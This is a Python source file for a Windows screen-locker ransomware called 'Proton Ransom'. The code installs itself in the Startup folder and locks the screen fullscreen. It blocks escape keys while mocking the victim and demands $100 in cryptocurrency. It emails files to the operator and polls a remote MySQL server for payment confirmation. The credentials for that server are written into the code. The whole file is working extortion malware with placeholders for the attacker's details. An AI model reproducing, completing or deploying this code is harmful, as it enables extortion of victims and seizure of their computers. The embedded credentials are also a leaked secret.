from calendar import c
from tkinter.font import Font

from tkinter import Tk, Entry, Label
from tkinter import messagebox
import tkinter.filedialog as fd
from pyautogui import click, moveTo
from tkinter import *
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import formatdate
from email import encoders

from requests import get
import webbrowser,sys,os,getpass
import mysql.connector
import pyautogui,random,smtplib,time,os,datetime

sistem = os.name
USER_NAME = getpass.getuser()
file_path=""


####SET WİNDOWS STARTUP####
if sistem == "nt":
        if file_path == "":
                file_path = os.path.realpath(__file__)
        bat_path = r'C:/Users/{}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'.format(USER_NAME)
        with open(bat_path + '\\' + "openProtonRansom.bat", "w+") as bat_file:
                bat_file.write(r'start "" "{}"'.format(file_path))
else:
        pass
####SET WİNDOWS STARTUP####

YOUR_EMAİL_ADDRESS = ""    #Your Email Address
YOUR_EMAIL_APPLICATION_PASSWORD = "" #Follow --> Gmail>Accound>Application Password


try:             
        window = Tk()
        pyautogui.FAILSAFE = False
        width = window.winfo_screenwidth()
        height = window.winfo_screenheight()
        window.title("SHALİA Hacked")
        window.attributes("-fullscreen",True)
        entry = Entry(window, font = 1)
        entry.place(relx=0.5, rely=0.5, anchor=CENTER)
        
        label0 = Label(window,text="HACKED BY SHALİA", font=1,fg="black")
        label0.place(relx=0.5, rely=0.6, anchor=N)



        label1 = Label(window, text="IF YOU WANT TO GET OUT OF THIS, SEND $100 EQUIVALENT BTC/ETH!\n\nYOUR_BTC ADDRESS\n\nWRITE 66 TO SEND PAYMENT SHEET!", font ="Arial 17 bold",bg="white",fg="black")
        label1.place(relx=0.5, rely=0.2, anchor=N)



        window.update()
        time.sleep(0.2)
        click(width/2, height/2)
        
        
        

        def altf4(event):
                liste=["COME ON! CAN'T YOU BE THAT STUPID?","IT IS NOT THAT EASY!","ARE YOU STUPID?","DEALING IN VAIN!","FUNNY BOY YOU!(İdiot)"]
                liste = random.choice(liste)
                messagebox.showinfo("SHALİA", liste)
        def callback(event):
                global k, entry
                if entry.get()    ==    "lRArsjH5qdpHsk68KQXMdvqAczshFtlbF":
                        k = True
                        toaddr = YOUR_EMAİL_ADDRESS
                        subject = "PROTON RANSOM | ÖDEME ALINDI"
                        message = "Hedef Cihazdan Ödeme Alındı. Proton İle Alakalı Her Şey Silindi."
                        content = 'Subject: {0}\n,{1}'.format(subject, message)
                        mail = smtplib.SMTP('smtp.gmail.com', 587)
                        mail.ehlo()
                        mail.starttls()
                        mail.login(YOUR_EMAİL_ADDRESS, YOUR_EMAIL_APPLICATION_PASSWORD)
                        mail.sendmail(YOUR_EMAİL_ADDRESS, toaddr, content)
                        mail.close()
                        messagebox.showinfo("SHALİA","Oh... Good. Thanks!\Take care of yourself👁")
                        os.remove(bat_path + '\\' + "openProtonRansom.bat")
                        window.destroy()
                        sys.exit()

                        
                               
                if entry.get()=="10":
                        webbrowser.open('')

                if entry.get()=="66":
                        currdir = os.getcwd()
                        tempdir = fd.askopenfilename(parent=window, initialdir= "/", title='SELECT FILE LOCATION')
                        msg = MIMEMultipart()
                        msg['From'] = YOUR_EMAİL_ADDRESS
                        msg['To'] = YOUR_EMAİL_ADDRESS
                        msg['Date'] = formatdate(localtime = True)
                        msg['Subject'] ="PROTON RANSOM | ÖDEME DEKONTU"
                        msg.attach(MIMEText("Keylogger Screenshot"))
                        part = MIMEBase('application', "octet-stream")
                        part.set_payload(open(tempdir, "rb").read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', 'attachment; filename="ödemeDEKONT.png"')
                        msg.attach(part)
                        smtp = smtplib.SMTP("smtp.gmail.com", 587)
                        smtp.starttls()
                        smtp.login(YOUR_EMAİL_ADDRESS,YOUR_EMAIL_APPLICATION_PASSWORD)
                        smtp.sendmail(YOUR_EMAİL_ADDRESS, YOUR_EMAİL_ADDRESS, msg.as_string())
                        smtp.quit()
                        messagebox.showinfo("SHALİA","PAYMENT RECEIPT SENT!\WE WILL SEND YOU THE SPECIAL CODE WHEN CONFIRMED!")
                        while True:
                                cnx = mysql.connector.connect(user = 'root', password = 'pyzhyc-gygBic-6hobso', host='91.151.88.110', database='AliceDataBase')
                                cursor = cnx.cursor() 
                                query = ("SELECT askupdate, message FROM updater")
                                cursor.execute(query)
                                for (askupdate,message) in cursor:
                                        yanit = askupdate
                                        if yanit == "SUCCESS":
                                                messagebox.showinfo("SHALİA","PAYMENT CONFIRMED!\n\nYOUR SPECIAL CODE IS: lRArsjH5qdpHsk68KQXMdvqAczshFtlbF")
                                                cursor.execute("SELECT askupdate, message FROM updater")
                                                data = cursor.fetchone()
                                                sql1 = "UPDATE updater SET askupdate ='NONE'"
                                                cursor.execute(sql1)
                                                cnx.commit()
                                                break
                                                
                                        else:
                                                label01 = Label(window,text="PAYMENT WAITING\n●••••", font=1,fg="black")
                                                label01.place(relx=0.5, rely=0.7, anchor=N)
                                                window.update()
                                                time.sleep(1.5)
                                                label01.destroy()
                                                label01 = Label(window,text="PAYMENT WAITING\n•●•••", font=1,fg="black")
                                                label01.place(relx=0.5, rely=0.7, anchor=N)
                                                window.update()
                                                time.sleep(1.5)
                                                label01.destroy()
                                                label01 = Label(window,text="PAYMENT WAITING\n••●••", font=1,fg="black")
                                                label01.place(relx=0.5, rely=0.7, anchor=N)
                                                window.update()
                                                time.sleep(1.5)
                                                label01.destroy()
                                                label01 = Label(window,text="PAYMENT WAITING\n•••●•", font=1,fg="black")
                                                label01.place(relx=0.5, rely=0.7, anchor=N)
                                                window.update()
                                                time.sleep(1.5)
                                                label01.destroy()
                                                label01 = Label(window,text="PAYMENT WAITING\n••••●", font=1,fg="black")
                                                label01.place(relx=0.5, rely=0.7, anchor=N)
                                                window.update()
                                                time.sleep(1.5)
                                                label01.destroy()
                                                time.sleep(1.5)
                                                
                                                
                                                


                
                
        def quit():
                exit()
                
                
        def on_closing():
                click(width/2, height/2)
                moveTo(width/2,height/2)
                window.attributes("-fullscreen", True)
                window.protocol("WM_DELETE_WİNDOW", on_closing)
                window.update()


                window.bind("<Control-KeyPress-c>",callback)
                window.bind("<Control-KeyPress-p>",callback)
                window.bind("<Return>",callback)


                window.bind("<Alt-KeyPress-F4>",altf4)
                window.bind("<Alt-KeyPress-Tab>",altf4)



        k = False 
        while not k:
           on_closing()

except:
        os.execl(sys.executable, os.path.abspath(__file__), *sys.argv) 
        
       